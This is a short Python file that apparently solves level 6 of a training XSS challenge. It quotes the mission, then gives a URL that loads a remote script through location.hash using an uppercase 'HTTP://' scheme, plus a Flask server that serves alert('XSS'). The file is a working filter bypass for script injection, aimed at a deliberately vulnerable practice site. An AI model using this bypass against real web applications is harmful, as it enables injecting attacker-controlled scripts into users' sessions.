'''Mission Description
Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash.

This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.
Mission Objective
Find a way to make the application request an external file which will cause it to execute an alert().'''


script ="https://xss-game.appspot.com/level6/frame#HTTP://127.0.0.1:5000/alert.js"

# set up a flask server to serve the external file
import os
from flask import Flask, send_file
app = Flask(__name__)

@app.route('/alert.js')
def alert():
    return "alert('XSS');"


if __name__ == "__main__":
    app.run(port=5000)
    
    